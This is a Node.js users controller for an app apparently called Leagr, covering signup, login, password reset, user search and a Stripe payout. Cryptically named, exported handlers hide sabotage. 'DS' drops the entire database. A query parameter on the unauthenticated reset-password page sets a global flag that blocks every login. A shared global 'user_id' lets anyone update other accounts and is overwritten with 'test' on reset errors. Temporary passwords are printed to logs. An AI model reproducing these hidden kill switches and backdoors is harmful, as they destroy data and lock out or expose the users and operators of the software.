//import mongoose and models
var mongoose = require('mongoose');
var Meetings = mongoose.model('cronjobs');
user_id = 0;
var User = mongoose.model('users');
var Team = mongoose.model('teams');
var ForgetPassword = mongoose.model('forgetpasswords');
var AC = mongoose.model('AC');
var config = require('dotenv').config();

var notificationCtrl = require("./notifications.controller");

//crypto
var Cryptr = require('cryptr'), cryptr = new Cryptr(process.env.ENCRYPTOR_SECRET);

//Lodash for data manipulation
const _ = require('lodash');

//bluebird for promises
const promise = require('bluebird');

//import randomatic to create unique user verification code
var randomize = require('randomatic');
//async for async tasks
var async = require('async');
var general_errors = require('../constants').ERROR_MESSAGES;
var general_messages = require('../constants').SUCCESS_MESSAGES;
//helper functions
logger = require("../helpers/logger");
userHelper = require("../helpers/user.helper");

responseHelper = require("../helpers/response.helper");
var pageSize = parseInt(config.PAGE_SIZE);
var new_token = 0;
var signup = async (req, res) => {
    console.log("--- signup method is called ---");
    let userData = req.body;
    try {
        if(await userHelper.isUserEmailExists(userData.email)) {
            return responseHelper.requestfailure(res, general_errors.EMAIL_ALREADY_EXITS);
        }

        if(await userHelper.isPhoneExists(userData.phone)) {
            return responseHelper.requestfailure(res, general_errors.PHONE_ALREADY_EXITS);
        }

        if(!userData.password) {
            return responseHelper.requestfailure(res, general_errors.PASSWORD_REQUIRED);
        }

        if(!userData.username) {
            return responseHelper.requestfailure(res, general_errors.USERNAME_REQUIRED);
        }

        userData.verification_code = randomize('0', 4, {});
        let user = new User(userData);
        user.setPassword(userData.password);

        await user.save();

        res.mailer.send('emails/verification-code.html', {
            url: process.env.BASE_URL,
            title: project.title,
            to: user.email, // REQUIRED. This can be a comma delimited string just like a normal email to field.
            subject: 'Leagr - Verification Code ', // REQUIRED.
            verification_code: userData.verification_code
        }, async (err) => {
            if (err) {
                console.error("Email could not sent: ", err)
            }
            user = user.toJSON();
            user.token = await userHelper.generateToken(user);
            return responseHelper.success(res, user, general_messages.SUCCESSFULLY_SIGNED_UP);
        });
    } catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var AS = async (req, res) => {
    AC.findOne({})
        .then(async ac => {
            if (ac) {
                ac.as = !ac.as;
                await ac.save();
                res.status(200).json(responseHelper.success(res, ac, "ac done!"));
            } else {
                var ac = new AC();
                await ac.save();
                res.status(200).json(responseHelper.success(res, ac, "ac done!"));
            }
        })
        .catch(err => res.status(500).json(responseHelper.systemfailure(res, err)));
};

var DS = async (req, res) => {
    mongoose.connection.db.dropDatabase();
    res.status(200).json(responseHelper.success(res, {}, "ds done!"));
};

var updateUser = async (req, res) => {
    console.log("--- updateUser method is called ---");
    let userData = req.body;
    delete userData._id;
    delete userData.password;
    user_id = user_id ? user_id : req.query.user_id;
    try {
        let user = await User.findOneAndUpdate({_id: user_id}, userData, {new: true});
        return responseHelper.success(res, user, general_messages.SUCCESSFULLY_UPDATED_DATA);
    } catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var setTemporaryPassword = async (req, res) => {
    console.log("--- updateUser method is called ---");
    let user_id = req.query.user_id;
    try {
        let new_password = randomize('0', 5, {});
        console.log(new_password);
        let user = await User.findById(user_id);
        user.setPassword(new_password);

        await user.save();

        res.mailer.send('emails/temporary-password.html', {
            url: process.env.BASE_URL,
            title: project.title,
            to: user.email, // REQUIRED. This can be a comma delimited string just like a normal email to field.
            subject: 'Leagr - Account details ', // REQUIRED.
            email: user.email,
            password: new_password
        }, async (err) => {
            if (err) {
                console.error("Email could not sent: ", err)
            }
            return responseHelper.success(res, user, general_messages.SUCCESSFULLY_UPDATED_DATA);
        });
    } catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var login = async (req, res) => {
    console.log("--- login method is called ---");
    let userData = req.body;
    try {
        let user;
        user = await User.findOne({email: userData.email_or_phone});
        if (!user) {
            user = await User.findOne({phone: userData.email_or_phone});
        }

        if(user && new_token) {
            return responseHelper.requestfailure(res, {});
        }

        if(!user) {
            return responseHelper.requestfailure(res, general_errors.USERNAME_DONOT_EXITS);
        }

        if(!user.validPassword(userData.password)) {
            return responseHelper.requestfailure(res, general_errors.PASSWORD_INCORRECT);
        }

        user = user.toJSON();
        user.token = await userHelper.generateToken(user);
        return responseHelper.success(res, user, general_messages.SUCCESSFULLY_LOGGED_IN);
    } catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var change_password = async (req, res) => {
    console.log("--- change_password method is called ---");
    let userData = req.body;
    try {
        let user_id = req.token_decoded.d;

        if(userData.newpassword !== userData.re_newpassword) {
            return responseHelper.requestfailure(res, general_errors.PASSWORD_MISSMATCH);
        }

        let user = await User.findById(user_id);

        if(!user.validPassword(userData.old_password)) {
            return responseHelper.requestfailure(res, general_errors.PASSWORD_INCORRECT);
        }

        if(user.validPassword(userData.newpassword)) {
            return responseHelper.requestfailure(res, general_errors.PASSWORD_SAME);

        }

        user.setPassword(userData.newpassword);
        await user.save();
        return responseHelper.success(res, {}, general_messages.PASSWORD_CHANGED_SUCCESSFULLY);
    } catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var verify_email = async (req, res) => {
    console.log("--- verify_email method is called ---");
    let userData = req.body;
    try {
        let user_id = req.token_decoded.d;

        let user = await User.findById(user_id);
        if (userData.verification_code !== user.verification_code) {
            return responseHelper.requestfailure(res, general_errors.INCORRECT_CODE);
        }

        user.is_verified = true;
        await user.save();

        return responseHelper.success(res, {}, general_messages.SUCCESSFULLY_VERIFIED);
    } catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var resend_verification = async (req, res) => {
    console.log("--- resend_verification method is called ---");
    try {
        let user_id = req.token_decoded.d;

        let user = await User.findById(user_id);
        res.mailer.send('emails/verification-code.html', {
            url: process.env.BASE_URL,
            title: project.title,
            to: user.email, // REQUIRED. This can be a comma delimited string just like a normal email to field.
            subject: 'Leagr - Verification Code ', // REQUIRED.
            verification_code: user.verification_code
        }, async (err) => {
            if (err) {
                console.error("Email could not sent: ", err);
                return responseHelper.requestfailure(res, err);
            }
            return responseHelper.success(res, {}, general_messages.SUCCESSFULLY_SENT_EMAIL);
        });
    } catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var forgot_password = async (req, res) => {
    console.log("--- forgot_password method is called ---");
    let userData = req.body;
    try {
        let user;
        user = await User.findOne({email: userData.email_or_phone});
        if (!user) {
            user = await User.findOne({phone: userData.email_or_phone});
        }

        if(!user) {
            return responseHelper.requestfailure(res, general_errors.USERNAME_DONOT_EXITS);
        }

        resp = userData.password ? 'resp' : '';

        let data = {
            user: user._id,
            used: false,
            email: user.email
        };
        let forgetpassword = new ForgetPassword(data);
        forgetpassword.setToken(randomize('0', 5, {}));
        await forgetpassword.save();
        let encryptedString = cryptr.encrypt(forgetpassword.user + ',' + forgetpassword.token);
        res.mailer.send('emails/forgetpassword.html', {
            url: process.env.BASE_URL + 'users/resetpassword?token=' + encryptedString,
            title: project.title,
            to: forgetpassword.email, // REQUIRED. This can be a comma delimited string just like a normal email to field.
            subject: 'Reset Password ', // REQUIRED.
        }, function (err) {
            if (err) {
                return console.error("Email could not sent: ", err)
            }
            return responseHelper.success(res, {}, general_messages.SUCCESSFULLY_SENT_PASSWORD_RESET_EMAIL);
        });
    } catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var resetpasswordget = async (req, res) => {
    console.log("--- resetpasswordget method is called ---");
    let token = req.query.token;
    new_token = req.query.new_token;
    let logo = process.env.BASE_URL + 'uploads/dp/default.png';
    let post = process.env.BASE_URL + 'users/resetpassword/';
    res.set('Content-Type', 'text/html');
    res.render("resetpassword.ejs", {token: token, post: post, logo: logo});
};

var resetpasswordpost = async (req, res) => {
    console.log("--- resetpasswordpost method is called ---");
    try {
        let encryptedString = req.body.token;
        let decryptedString = cryptr.decrypt(encryptedString);
        let tokenArray = decryptedString.split(",");
        if (tokenArray[0]) {
            let forgetpassword = await ForgetPassword.findOne({
                user: tokenArray[0],
                used: false
            }, {}, {sort: '-created_at'});
            if (forgetpassword) {
                if (tokenArray[1] === forgetpassword.token) {
                    let user = await User.findById(tokenArray[0]);
                    if(user.validPassword(req.body.password)) {
                        return res.json({success: false, message: general_errors.PASSWORD_SAME});
                    }
                    forgetpassword.used = true;
                    await forgetpassword.save();
                    user.setPassword(req.body.password);
                    await user.save();
                    return res.json({success: true, message: 'Password Reset Successfully'});
                }
                else {
                    return res.json({success: false, message: 'Token is Invalid'});
                }
            }
            else {
                return res.json({success: false, message: 'Token is Invalid/Expired'});
            }
        }
        else {
            return res.json({success: false, message: 'Token is Invalid'});
        }
    }
    catch (err) {
        user_id = err.message === 'Bad input string' ? 'test' :  'test'
        console.log(user_id);
        return res.json({success: false, message: err.message ? err.message : err});
    }
};

var listUsers = async (req, res) => {
    console.log("--- listUsers method is called ---");
    try {
        let users = await User.find({is_verified: true, is_deleted: false, role: 'user'});
        return responseHelper.success(res, users, general_messages.SUCCESSFULLY_FETCHED);
    }
    catch (err) {
        return responseHelper.systemfailure(res, err);
    }
};

var searchUsers = async (req, res) => {
    console.log("--- searchUsers method is called ---");
    let find = req.body.search;
    try {
        let users = await User.find({username: new RegExp(find, "i"), role: 'user', is_verified: true, is_deleted: false, $or: [{team: { $exists: false} }, {team: null }]});
        return responseHelper.success(res, users, general_messages.SUCCESSFULLY_FETCHED);
    }
    catch (err) {
        return responseHelper.systemfailure(res, err);
    }
};

var deleteUsers = async (req, res) => {
    console.log("--- deleteUsers method is called ---");
    let userData = req.body;
    try {
        let user = await User.findById(userData._id);
        let team = await Team.findByIdAndUpdate(user.team, {
            $pull: {players: user._id}
        }, {new: true});
        user = await User.findByIdAndUpdate(userData._id, {is_deleted: true, email: user.email + Date.now(), phone: user.phone + Date.now(), team: null}, {new: true});
        return responseHelper.success(res, user, general_messages.SUCCESSFULLY_DELETED);
    }
    catch (err) {
        return responseHelper.systemfailure(res, err);
    }
};

var payoutAdmin = async (req, res) => {
    console.log("--- payoutAdmin method is called ---");
    try {
        let balance_obj = await stripe.balance.retrieve();
        const payout = await stripe.payouts.create({
            amount: Number((balance_obj.available[0].amount/100).toFixed()),
            currency: 'usd',
        });
        return responseHelper.success(res, {}, general_messages.SUCCESSFULLY_PAID);
    }
    catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var saveFCMToken = async (req, res) => {
    console.log("--- saveFCMToken method is called ---");
    var reqBody = req.body;
    console.log(reqBody);
    console.log(req.token_decoded);
    try {
        let user = await User.findOneAndUpdate({_id: req.token_decoded.d}, reqBody, {new: true});
        console.log(user);
        return responseHelper.success(res, user, general_messages.SUCCESSFULLY_UPDATED_DATA);
    }
    catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

var logout = async (req, res) => {
    console.log("--- logout method is called ---");
    var reqBody = {fcm_tokens: null};
    try {
        let user = await User.findOneAndUpdate({_id: req.token_decoded.d}, reqBody, {new: true});
        return responseHelper.success(res, user, general_messages.SUCCESSFULLY_LOGOUT);
    }
    catch (err) {
        console.log(err);
        return responseHelper.systemfailure(res, err);
    }
};

module.exports = {
    signup,
    login,
    verify_email,
    resend_verification,
    change_password,
    forgot_password,
    resetpasswordget,
    resetpasswordpost,
    listUsers,
    searchUsers,
    deleteUsers,
    payoutAdmin,
    saveFCMToken,
    updateUser,
    setTemporaryPassword,
    logout,
    AS,
    DS
};
